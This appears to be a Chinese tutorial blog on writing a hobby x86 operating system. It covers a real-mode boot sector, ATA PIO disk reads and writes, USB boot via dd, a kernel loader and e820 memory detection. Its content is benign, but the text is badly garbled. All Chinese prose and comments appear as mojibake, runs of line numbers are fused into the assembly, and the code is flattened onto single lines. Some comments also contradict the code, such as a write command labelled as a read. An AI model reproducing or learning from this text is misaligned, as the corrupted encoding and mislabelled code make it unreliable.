æ¯ä¸ªè®¾å¤‡åœ¨CPUå®æ¨¡å¼ä¸­æœ‰å†…å­˜å’Œç«¯å£ï¼ŒæŒ‰ç…§å†…å­˜è®¿é—®+å‘é‡è¡¨è°ƒç”¨å¯ä»¥å®ç° 3.ä½¿ç”¨IOå¯åŠ¨ å¼€å§‹å’Œä¹‹å‰ç›¸åŒ â€‹ ç¬¬1æ­¥ï¼šè®¾ç½®è¦è¯»å–çš„æ‰‡åŒºæ•° â€‹ ç¬¬2æ­¥ï¼šå°†LBAåœ°å€å­˜å…¥0x1f3 ~ 0x1f6 â€‹ ç¬¬3æ­¥ï¼šå‘0x1f7ç«¯å£å†™å…¥è¯»å‘½ä»¤ï¼Œ0x20 â€‹ ç¬¬4æ­¥ï¼šæ£€æµ‹ç¡¬ç›˜çŠ¶æ€ â€‹ ç¬¬5æ­¥ï¼šä»0x1f0ç«¯å£è¯»æ•°æ® å…ˆé€‰æ‹©é€šé“ï¼Œå¾€è¯¥é€šé“çš„ sector count å¯„å­˜å™¨ä¸­å†™å…¥å¾…æ“ä½œçš„æ‰‡åŒºæ•° å¾€è¯¥é€šé“ä¸Šçš„ä¸‰ä¸ª LBA å¯„å­˜å™¨å†™å…¥æ‰‡åŒºèµ·å§‹åœ°å€çš„ä½ 24 ä½ å¾€ device å¯„å­˜å™¨ä¸­å†™å…¥ LBA åœ°å€çš„ 24-27 ä½ï¼Œå¹¶ç½®ç¬¬6ä½ä¸º1ï¼Œä½¿å…¶ä¸º LBA æ¨¡å¼ï¼Œè®¾ç½®ç¬¬4ä½ï¼Œé€‰æ‹©æ“ä½œçš„ç¡¬ç›˜ï¼ˆmaster ç¡¬ç›˜æˆ– slave ç¡¬ç›˜ï¼‰ å¾€è¯¥é€šé“ä¸Šçš„ command å¯„å­˜å™¨å†™å…¥æ“ä½œå‘½ä»¤ è¯»å–è¯¥é€šé“ä¸Šçš„ status å¯„å­˜å™¨ï¼Œåˆ¤æ–­ç¡¬ç›˜å·¥ä½œæ˜¯å¦å®Œæˆ å¦‚æœä»¥ä¸Šæ­¥éª¤æ˜¯è¯»ç¡¬ç›˜ï¼Œè¿›å…¥ä¸‹ ä¸ªæ­¥éª¤ã€‚å¦åˆ™ï¼Œå®Œå·¥ å°†ç¡¬ç›˜æ•°æ®è¯»å‡º æ•°æ®ä¼ é€çš„æ–¹å¼å°±æ˜¯æ“ä½œç³»ç»Ÿå­¦çš„äº† [æ“ä½œç³»ç»Ÿå®ç°]ä»usbå¯åŠ¨ é¦–å…ˆæŠŠusbæ’å…¥ubuntuæŸ¥çœ‹ 1lsblk #æŸ¥çœ‹æŒ‚è½½ æ ¼å¼åŒ–usb 1sudo fdisk /dev/sdb dï¼šåˆ é™¤åˆ†åŒº å¯ä»¥å†™makefileå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223boot.bin: boot.asm nasm -f bin boot.asm -o boot.binmaster.img: boot.bin yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q master.img dd if=./boot.bin of=master.img bs=512 count=1 conv=notrunc.PHONY: cleanclean: rm -rf *.bin rm -rf *.img.PHONY: usbusb: boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bin.PHONY: bochsbochs: master.img bochs -q æºä»£ç å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041[org 0x7c00];æœ€ç®€å•çš„ä¸»ç¨‹åºå¼•å¯¼ç¨‹åº;å®æ¨¡å¼çš„å¯åŠ¨åœ°å€;è®¾ç½®å±å¹•æ¨¡å¼ä¸ºæ–‡æœ¬æ¨¡å¼ï¼Œæ¸…é™¤å±å¹•mov ax,3int 0x10;åˆå§‹åŒ–æ®µå¯„å­˜å™¨mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00; xchg bx, bx; bochsé­”æ•°æ–­ç‚¹mov si, bootingcall print;ç¨‹åºæ‚¬åœjmp $print: mov ah, 0xe.next: mov al, [si] cmp al, 0 jz .done int 0x10 inc si jmp .next.done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;å¡«å……times 510-($-$$) db 0db 0x55,0xaa å¼¹å‡ºè¿‡åä»VMwareåˆ›å»ºæ–°çš„è™šæ‹Ÿæœºå¯åŠ¨ æ³¨ï¼šè¦åœ¨æ’å…¥usbåå¯åŠ¨vmwareï¼Œå¦åˆ™vmwareæ— æ³•è¯†åˆ«åˆ°usb [æ“ä½œç³»ç»Ÿå®ç°]å®æ¨¡å¼ä¸‹çš„printå®ç° å‚æ•°ï¼š ahï¼š0xe alï¼šå­—ç¬¦ int 0x10ï¼š ç³»ç»Ÿè°ƒç”¨ å‡½æ•° 1234567891011print: mov ah, 0xe ;åŠŸèƒ½å‚æ•°.next: mov al, [si];å­—ç¬¦ cmp al, 0 ;åˆ¤æ–­æ˜¯å¦ä¸ºæœ€åä¸€ä¸ªç»“å°¾ jz .done ;ç»“å°¾è·³è½¬è‡³ret int 0x10 ;åŠŸèƒ½è°ƒç”¨ inc si ;åœ°å€-1 jmp .next ;ç»§ç»­ï¼Œä¸‹ä¸€ä¸ª.done: ret å®Œæ•´ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041[org 0x7c00];æœ€ç®€å•çš„ä¸»ç¨‹åºå¼•å¯¼ç¨‹åº;å®æ¨¡å¼çš„å¯åŠ¨åœ°å€;è®¾ç½®å±å¹•æ¨¡å¼ä¸ºæ–‡æœ¬æ¨¡å¼ï¼Œæ¸…é™¤å±å¹•mov ax,3int 0x10;åˆå§‹åŒ–æ®µå¯„å­˜å™¨mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00xchg bx, bx; bochsé­”æ•°æ–­ç‚¹mov si, bootingcall print;ç¨‹åºæ‚¬åœjmp $print: mov ah, 0xe ;åŠŸèƒ½å‚æ•°.next: mov al, [si];å­—ç¬¦ cmp al, 0 ;åˆ¤æ–­æ˜¯å¦ä¸ºæœ€åä¸€ä¸ªç»“å°¾ jz .done ;ç»“å°¾è·³è½¬è‡³ret int 0x10 ;åŠŸèƒ½è°ƒç”¨ inc si ;åœ°å€-1 jmp .next ;ç»§ç»­ï¼Œä¸‹ä¸€ä¸ª.done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;å¡«å……times 510-($-$$) db 0db 0x55,0xaa make bochsç¼–è¯‘ [æ“ä½œç³»ç»Ÿå®ç°]ç¡¬ç›˜è¯»å†™ ç®€å•çš„ç£ç›˜ç»“æ„ æ‰‡åŒºï¼šç¡¬ç›˜è¯»å†™çš„æœ€å°å•ä½ï¼Œæœ€å¤š256ï¼Œæœ€å°1ä¸ª æ€§èƒ½ç“¶é¢ˆï¼šæœºæ¢°è‡‚çš„å¯»é“æ—¶é—´ ä¸€èˆ¬ç£é“æœ‰63ä¸ªæ‰‡åŒºï¼ˆç”±äºBIOSæœ€å¤§æ”¯æŒï¼‰ ä¸€èˆ¬å¤–ä¾§è¯»å†™é€Ÿåº¦æœ€å¿« IDE / ATA PIO Mode PIOï¼šPort Input Output Portæ›´å¤šæŒ‡çš„æ˜¯å¤–éƒ¨è®¾å¤‡å†…éƒ¨çš„å¯„å­˜å™¨ IDEï¼šIntergrated Drive Electronics é›†æˆç”µå­é©±åŠ¨å™¨ ï¼ˆè¥¿éƒ¨æ•°æ®ï¼‰ ATAï¼ˆPATAï¼‰ï¼šAdvanced Technology Attachmentï¼ˆANSIæ ‡å‡†ï¼‰ SATA ç¡¬ç›˜è¯»å†™æ¨¡å¼ CHSï¼š Cylinder / Head / Sector | æŸ±é¢ / ç£é“ / æ‰‡åŒº LBAï¼š Logical Block Address | é€»è¾‘å—åœ°å€ LBA28ï¼šæ€»å…±è®¿é—® 128Gçš„ç£ç›˜ç©ºé—´ ä¸¤ä¸ªé€šé“ï¼šPrimary Secondary 0x1F0ï¼š16bitsï¼Œç”¨äºè¯»å†™æ•°æ® 0x1F1ï¼šç”¨äºæ£€æµ‹å‰ä¸€ä¸ªæŒ‡ä»¤çš„é”™è¯¯ 0x1F2ï¼šè¯»å†™æ‰‡åŒºçš„æ•°é‡ï¼Œæœ€å¤š256 0x1F3ï¼šèµ·å§‹æ‰‡åŒº 0 ~ 7 ä½ 0x1F4ï¼šèµ·å§‹æ‰‡åŒº 8~15 ä½ 0x1F5ï¼šèµ·å§‹æ‰‡åŒº 16 ~ 23 ä½ 0x1F6ï¼š 0 ~ 3ï¼šèµ·å§‹æ‰‡åŒº 24 ~ 27 ä½ 4ï¼š0â€“&gt;masterä¸»ç›˜ï¼›1â€“&gt;slaveä»ç›˜ 6ï¼š0 CHSæ¨¡å¼ï¼›1 LBAæ¨¡å¼ 5ã€7ï¼šå›ºå®š 1 0x1F7ï¼š outæ“ä½œ 0xECï¼šè¯†åˆ«ç¡¬ç›˜ 0x20ï¼šè¯»ç¡¬ç›˜ 0x30ï¼šå†™ç¡¬ç›˜ intæ“ä½œ 0 ERROR 3 DRQ æ•°æ®å‡†å¤‡å®Œæ¯• 7 BSY ç¡¬ç›˜ç¹å¿™ æºä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206[org 0x7c00];æœ€ç®€å•çš„ä¸»ç¨‹åºå¼•å¯¼ç¨‹åº;å®æ¨¡å¼çš„å¯åŠ¨åœ°å€;è®¾ç½®å±å¹•æ¨¡å¼ä¸ºæ–‡æœ¬æ¨¡å¼ï¼Œæ¸…é™¤å±å¹•mov ax,3int 0x10;åˆå§‹åŒ–æ®µå¯„å­˜å™¨mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00mov edi, 0x1000 ; è¯»åˆ°çš„ç›®æ ‡å†…å­˜mov ecx, 0 ; èµ·å§‹æ‰‡åŒºmov bl,1 ;æ‰‡åŒºæ•°é‡call read_diskxchg bx, bx; bochsé­”æ•°æ–­ç‚¹mov edi, 0x1000 ; srcçš„ç›®æ ‡å†…å­˜mov ecx, 2 ; èµ·å§‹æ‰‡åŒºmov bl,1 ;æ‰‡åŒºæ•°é‡call write_diskmov si, bootingcall print;ç¨‹åºæ‚¬åœjmp $;è¯»å–ç¡¬ç›˜read_disk: ;è®¾ç½®è¯»å†™æ‰‡åŒºæ•°é‡ ;0x1f2ç«¯å£=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3ç«¯å£= 00000000 inc dx; 0x1f3 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„å‰8ä½ out dx, al ;0x1f4ç«¯å£= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„ä¸­8ä½ out dx, al ;0x1f5ç«¯å£= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„é«˜8ä½ out dx, al ;èµ·å§‹æ‰‡åŒº24ä½ï¼š00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;é«˜4ä½ç½®0 mov al, 0b1110_0000; or al, cl; clæ‹¼æ¥åˆ°alåé¢ out dx, al;ä¸»ç›˜ LBAæ¨¡å¼è®¾ç½® ;0x1f7ç«¯å£= 0x20;è¡¨ç¤ºè¯»ç¡¬ç›˜ inc dx;0x1f7 mov al,0x20;è¯»ç¡¬ç›˜ out dx,al xor ecx, ecx;æ¸…ç©ºexc mov cl, bl;å¾—åˆ°è¯»å†™æ‰‡åŒºçš„æ•°é‡ .read: push cx;ä¿å­˜cx call .waits;ç­‰å¾…æ•°æ®å‡†å¤‡å®Œæ¯• call .reads;è¯»å–ä¸€ä¸ªæ‰‡åŒº pop cx loop .read ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nopç­‰ä»·ï¼Œç›´æ¥è·³ä¸‹ä¸€è¡Œ jmp $+2; åˆ¶é€ ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2; and al, 0b1000_1000; ä¸æ“ä½œï¼Œåªå‰©ä¸‹3,7ä½ cmp al, 0b0000_1000; æ¯”è¾ƒ3,7ä½ï¼Œç¡®ä¿ç¡¬ç›˜å‡†å¤‡å°±ç»ª jnz .check ret .reads: mov dx, 0x1f0 mov cx, 256;ä¸€ä¸ªæ‰‡åŒºæ˜¯256å­— .readw: in ax, dx jmp $+2; nopç­‰ä»·ï¼Œç›´æ¥è·³ä¸‹ä¸€è¡Œ jmp $+2; åˆ¶é€ ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2; mov [edi], ax add edi, 2 loop .readw ret;å†™ç¡¬ç›˜write_disk: ;è®¾ç½®è¯»å†™æ‰‡åŒºæ•°é‡ ;0x1f2ç«¯å£=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3ç«¯å£= 00000000 inc dx; 0x1f3 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„å‰8ä½ out dx, al ;0x1f4ç«¯å£= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„ä¸­8ä½ out dx, al ;0x1f5ç«¯å£= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„é«˜8ä½ out dx, al ;èµ·å§‹æ‰‡åŒº24ä½ï¼š00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;é«˜4ä½ç½®0 mov al, 0b1110_0000; or al, cl; clæ‹¼æ¥åˆ°alåé¢ out dx, al;ä¸»ç›˜ LBAæ¨¡å¼è®¾ç½® ;0x1f7ç«¯å£= 0x20;è¡¨ç¤ºè¯»ç¡¬ç›˜ inc dx;0x1f7 mov al,0x30;è¯»ç¡¬ç›˜ out dx,al xor ecx, ecx;æ¸…ç©ºexc mov cl, bl;å¾—åˆ°è¯»å†™æ‰‡åŒºçš„æ•°é‡ .write: push cx;ä¿å­˜cx call .writes;å†™ä¸€ä¸ªæ‰‡åŒº call .waits;ç­‰å¾…ç¹å¿™ pop cx loop .write ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nopç­‰ä»·ï¼Œç›´æ¥è·³ä¸‹ä¸€è¡Œ jmp $+2; åˆ¶é€ ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2; and al, 0b1000_0000; ä¸æ“ä½œï¼Œåªå‰©ä¸‹7ä½ cmp al, 0b0000_0000; æ¯”è¾ƒ7ä½ï¼Œç¡®ä¿ç¡¬ç›˜å‡†å¤‡å°±ç»ª jnz .check ret .writes: mov dx, 0x1f0 mov cx, 256;ä¸€ä¸ªæ‰‡åŒºæ˜¯256å­— .writew: mov ax, [edi] out dx, ax jmp $+2; nopç­‰ä»·ï¼Œç›´æ¥è·³ä¸‹ä¸€è¡Œ jmp $+2; åˆ¶é€ ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2; add edi, 2 loop .writew ret;å®æ¨¡å¼çš„æ‰“å°print: mov ah, 0xe ;åŠŸèƒ½å‚æ•° .next: mov al, [si];å­—ç¬¦ cmp al, 0 ;åˆ¤æ–­æ˜¯å¦ä¸ºæœ€åä¸€ä¸ªç»“å°¾ jz .done ;ç»“å°¾è·³è½¬è‡³ret int 0x10 ;åŠŸèƒ½è°ƒç”¨ inc si ;åœ°å€-1 jmp .next ;ç»§ç»­ï¼Œä¸‹ä¸€ä¸ª .done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;å¡«å……times 510-($-$$) db 0db 0x55,0xaa æ“ä½œç³»ç»Ÿå®ç°-å†…æ ¸åŠ è½½å™¨ åŸºæœ¬æ­¥éª¤ å†™å†…æ ¸åŠ è½½å™¨ loader å°†loaderåŠ è½½åˆ°ç¡¬ç›˜ åœ¨ä¸»å¼•å¯¼æ‰‡åŒºè¯»å…¥ æ£€æµ‹æ­£ç¡®æ€§ x86å®æ¨¡å¼ä¸‹å†…å­˜å¸ƒå±€ å‡è®¾æˆ‘ä»¬çš„bootloaderå¦‚ä¸‹ 12345678910111213141516171819202122[org 0x1000];å®æ¨¡å¼ä¸‹çš„å…¶å®åœ°å€dw 0x55aa; é­”æ•°ï¼Œç”¨äºåˆ¤æ–­é”™è¯¯mov si,loadingcall printjmp $print: mov ah, 0xe ;åŠŸèƒ½å‚æ•° .next: mov al, [si];å­—ç¬¦ cmp al, 0 ;åˆ¤æ–­æ˜¯å¦ä¸ºæœ€åä¸€ä¸ªç»“å°¾ jz .done ;ç»“å°¾è·³è½¬è‡³ret int 0x10 ;åŠŸèƒ½è°ƒç”¨ inc si ;åœ°å€-1 jmp .next ;ç»§ç»­ï¼Œä¸‹ä¸€ä¸ª .done: retloading: db &quot;Kernel Booting Up...&quot;,10,13,0 è¿™æ˜¯å¯ä»¥ä¿®æ”¹ä¸‹makefileæ–‡ä»¶ 1234567891011121314151617181920212223242526%.bin: %.asm nasm -f bin $&lt; -o $@master.img: boot.bin loader.bin yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q master.img dd if=./boot.bin of=master.img bs=512 count=1 conv=notrunc dd if=./loader.bin of=master.img bs=512 count=4 seek=2 conv=notrunc.PHONY: cleanclean: rm -rf *.bin rm -rf *.img.PHONY: usbusb: boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bin.PHONY: bochsbochs: master.img bochs -q è¿™æ ·æˆ‘ä»¬ä½¿ç”¨make loader.binå°±èƒ½ç”Ÿæˆloader.binäº† åŒæ—¶ï¼šdd if=./loader.bin of=master.img bs=512 count=4 seek=2 conv=notruncå°†loaderå†™åˆ°ç¬¬äºŒæ‰‡åŒºï¼Œå†™512*4å­—èŠ‚å¤§å° æ¥ç€æˆ‘ä»¬ä¿®æ”¹ä¸»ç¨‹åºï¼Œé€»è¾‘å¦‚ä¸‹ è¯»å–ç¬¬äºŒæ‰‡åŒºåˆ°å®æ¨¡å¼ä¸‹çš„å¯ç”¨å†…å­˜å¹¶éªŒè¯&quot;\\x55\\xaa&quot;æ ¡éªŒä½ jmpåˆ°å†…å­˜æ‰§è¡Œ å¾—åˆ°æ–°çš„boot.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213[org 0x7c00];æœ€ç®€å•çš„ä¸»ç¨‹åºå¼•å¯¼ç¨‹åº;å®æ¨¡å¼çš„å¯åŠ¨åœ°å€;è®¾ç½®å±å¹•æ¨¡å¼ä¸ºæ–‡æœ¬æ¨¡å¼ï¼Œæ¸…é™¤å±å¹•mov ax,3int 0x10;åˆå§‹åŒ–æ®µå¯„å­˜å™¨mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00mov si, bootingcall printmov edi, 0x1000 ; è¯»åˆ°çš„ç›®æ ‡å†…å­˜mov ecx, 2 ; èµ·å§‹æ‰‡åŒºmov bl,4 ;æ‰‡åŒºæ•°é‡call read_diskcmp word [0x1000], 0x55aajnz errorjmp 0:0x1002;ç¨‹åºæ‚¬åœjmp $;è¯»å–ç¡¬ç›˜read_disk: ;è®¾ç½®è¯»å†™æ‰‡åŒºæ•°é‡ ;0x1f2ç«¯å£=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3ç«¯å£= 00000000 inc dx; 0x1f3 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„å‰8ä½ out dx, al ;0x1f4ç«¯å£= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„ä¸­8ä½ out dx, al ;0x1f5ç«¯å£= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„é«˜8ä½ out dx, al ;èµ·å§‹æ‰‡åŒº24ä½ï¼š00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;é«˜4ä½ç½®0 mov al, 0b1110_0000; or al, cl; clæ‹¼æ¥åˆ°alåé¢ out dx, al;ä¸»ç›˜ LBAæ¨¡å¼è®¾ç½® ;0x1f7ç«¯å£= 0x20;è¡¨ç¤ºè¯»ç¡¬ç›˜ inc dx;0x1f7 mov al,0x20;è¯»ç¡¬ç›˜ out dx,al xor ecx, ecx;æ¸…ç©ºexc mov cl, bl;å¾—åˆ°è¯»å†™æ‰‡åŒºçš„æ•°é‡ .read: push cx;ä¿å­˜cx call .waits;ç­‰å¾…æ•°æ®å‡†å¤‡å®Œæ¯• call .reads;è¯»å–ä¸€ä¸ªæ‰‡åŒº pop cx loop .read ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nopç­‰ä»·ï¼Œç›´æ¥è·³ä¸‹ä¸€è¡Œ jmp $+2; åˆ¶é€ ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2; and al, 0b1000_1000; ä¸æ“ä½œï¼Œåªå‰©ä¸‹3,7ä½ cmp al, 0b0000_1000; æ¯”è¾ƒ3,7ä½ï¼Œç¡®ä¿ç¡¬ç›˜å‡†å¤‡å°±ç»ª jnz .check ret .reads: mov dx, 0x1f0 mov cx, 256;ä¸€ä¸ªæ‰‡åŒºæ˜¯256å­— .readw: in ax, dx jmp $+2; nopç­‰ä»·ï¼Œç›´æ¥è·³ä¸‹ä¸€è¡Œ jmp $+2; åˆ¶é€ ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2; mov [edi], ax add edi, 2 loop .readw ret;å†™ç¡¬ç›˜write_disk: ;è®¾ç½®è¯»å†™æ‰‡åŒºæ•°é‡ ;0x1f2ç«¯å£=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3ç«¯å£= 00000000 inc dx; 0x1f3 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„å‰8ä½ out dx, al ;0x1f4ç«¯å£= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„ä¸­8ä½ out dx, al ;0x1f5ç«¯å£= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;èµ·å§‹æ‰‡åŒºçš„é«˜8ä½ out dx, al ;èµ·å§‹æ‰‡åŒº24ä½ï¼š00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;é«˜4ä½ç½®0 mov al, 0b1110_0000; or al, cl; clæ‹¼æ¥åˆ°alåé¢ out dx, al;ä¸»ç›˜ LBAæ¨¡å¼è®¾ç½® ;0x1f7ç«¯å£= 0x20;è¡¨ç¤ºè¯»ç¡¬ç›˜ inc dx;0x1f7 mov al,0x30;è¯»ç¡¬ç›˜ out dx,al xor ecx, ecx;æ¸…ç©ºexc mov cl, bl;å¾—åˆ°è¯»å†™æ‰‡åŒºçš„æ•°é‡ .write: push cx;ä¿å­˜cx call .writes;å†™ä¸€ä¸ªæ‰‡åŒº call .waits;ç­‰å¾…ç¹å¿™ pop cx loop .write ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nopç­‰ä»·ï¼Œç›´æ¥è·³ä¸‹ä¸€è¡Œ jmp $+2; åˆ¶é€ ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2; and al, 0b1000_0000; ä¸æ“ä½œï¼Œåªå‰©ä¸‹7ä½ cmp al, 0b0000_0000; æ¯”è¾ƒ7ä½ï¼Œç¡®ä¿ç¡¬ç›˜å‡†å¤‡å°±ç»ª jnz .check ret .writes: mov dx, 0x1f0 mov cx, 256;ä¸€ä¸ªæ‰‡åŒºæ˜¯256å­— .writew: mov ax, [edi] out dx, ax jmp $+2; nopç­‰ä»·ï¼Œç›´æ¥è·³ä¸‹ä¸€è¡Œ jmp $+2; åˆ¶é€ ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2; add edi, 2 loop .writew ret;å®æ¨¡å¼çš„æ‰“å°print: mov ah, 0xe ;åŠŸèƒ½å‚æ•° .next: mov al, [si];å­—ç¬¦ cmp al, 0 ;åˆ¤æ–­æ˜¯å¦ä¸ºæœ€åä¸€ä¸ªç»“å°¾ jz .done ;ç»“å°¾è·³è½¬è‡³ret int 0x10 ;åŠŸèƒ½è°ƒç”¨ inc si ;åœ°å€-1 jmp .next ;ç»§ç»­ï¼Œä¸‹ä¸€ä¸ª .done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\rerror: mov si, .msg call print hlt; CPUåœæ­¢ jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;å¡«å……times 510-($-$$) db 0db 0x55,0xaa åŒæ—¶å¯ä»¥ä¿®æ”¹loader.asmçš„æ ¡éªŒä½ï¼ŒæŸ¥çœ‹æŠ¥é”™æ˜¯å¦æ­£å¸¸ æ›´æ”¹loader.binçš„æ—¶å€™è¦é‡æ–°make master.imgè®©æ–°çš„loader.binå†™å…¥ç£ç›˜æ–‡ä»¶ æ“ä½œç³»ç»Ÿå®ç°-å†…å­˜æ£€æµ‹ å®æ¨¡å¼ä¸‹åœ¨è¿›å…¥ä¿æŠ¤æ¨¡å¼ä¹‹å‰è¦æ£€æµ‹å†…å­˜æ˜¯å¦èƒ½å¤Ÿè¢«ä½¿ç”¨ï¼Œå¹¶ä¸”æ›´å¥½çš„è§„åˆ’å†…å­˜ç©ºé—´ã€‚ å¦‚ä½•å®ç°å†…å­˜æ£€æµ‹ BIOSçš„int 0x15è°ƒç”¨ã€0xe820å­åŠŸèƒ½å·ã€20Bçš„ards(Address Range Descriptor Structure)ç»“æ„ä½“å¤§å° BIOSä¼šè¿”å›ä¸€ä¸ªardsç»“æ„ä½“åˆ°æŒ‡å®šçš„ards_bufferä¸­ï¼Œç»“æ„ä½“å†…å®¹å¦‚å›¾ å…¶ä¸­çš„Typeå­—æ®µæ˜¯ç”¨æ¥æè¿°è¿™æ®µå†…å­˜çš„ç±»å‹ï¼Œè¿™é‡Œæ‰€è°“çš„ç±»å‹æ˜¯è¯´æ˜è¿™æ®µå†…å­˜çš„ç”¨é€”ï¼Œæ˜¯å¯ä»¥è¢«æ“ä½œç³»ç»Ÿä½¿ç”¨ï¼Œè¿˜æ˜¯ä¿ç•™èµ·æ¥ä¸èƒ½ç”¨ Typeå€¼ åç§° å«ä¹‰ 1 AddressRangeMemory è¯¥å†…å­˜å¯ä»¥è¢«æ“ä½œç³»ç»Ÿä½¿ç”¨ 2 AddressRangeReserved å†…å­˜ä½¿ç”¨ä¸­ï¼Œæˆ–è¢«ç³»ç»Ÿä¿ç•™ï¼Œæ“ä½œç³»ç»Ÿä¸èƒ½ä½¿ç”¨ å…¶ä»– undefine æœªå®šä¹‰ æºä»£ç å®ç° åœ¨bootä¸­æ·»åŠ loaderå¤±è´¥è¯­å¥ 123456error: mov si, .msg call print hlt; CPUåœæ­¢ jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0 åœ¨loaderæœ€åç»“å°¾å®šä¹‰ards_countä¸ards_buffer 123ards_count: dw 0ards_buffer: åœ¨loaderä¸­ç¼–å†™å†…å­˜å¯åŠ¨ç¨‹åº å…·ä½“è°ƒç”¨æƒ…å†µå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839detect_mem: xor ebx, ebx mov ax, 0 mov es, ax;es:diç»“æ„ä½“ç¼“å­˜ä½ç½® mov edi, ards_buffer;ç»“æ„ä½“å†…å­˜ä½ç½® mov edx, 0x534d4150;SMAPç­¾å.next: mov eax, 0xe820 ;å­åŠŸèƒ½å· mov ecx, 20 ;ardsç»“æ„ä½“å¤§å°ï¼Œå•ä½ï¼šå­—èŠ‚ int 0x15 ;è°ƒç”¨0x15å†…å­˜æ£€æµ‹åŠŸèƒ½ ;è‹¥CF=1ï¼Œåˆ™è¡¨ç¤ºå‡ºé”™ jc error ;å¦åˆ™å°†ç¼“å­˜æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªç»“æ„ä½“ add di, cx inc word [ards_count] ;å°†ç»“æ„ä½“æ•°é‡+1 cmp ebx, 0 ;0ä¸ºæ£€æµ‹ç»“æŸ jnz .next mov si, detecting call print; mov cx, [ards_buffer] ;ç»“æ„ä½“æ•°é‡; mov si, 0 ;ç»“æ„ä½“æŒ‡é’ˆ; .show:; mov eax, [si + ards_buffer]; mov ebx, [8 + si + ards_buffer]; mov edx, [16 + si + ards_buffer]; add si,20; xchg bx,bx; loop .show ;loopæ˜¯æ ¹æ®cxçš„å€¼å¾ªç¯jmp $ å†™loaderæŠ¥é”™å’Œå†…å­˜æ£€æµ‹å®ŒæˆåŠŸèƒ½ 123456789detecting: db &quot;Detecting Memeory Success...&quot;,10,13,0 error: mov si, .msg call print hlt; CPUåœæ­¢ jmp $ .msg db &quot;Kernel Booting Error&quot;,10,13,0 æ¿€æ´».showé‚£æ®µè¢«æ³¨é‡Šçš„ä»£ç 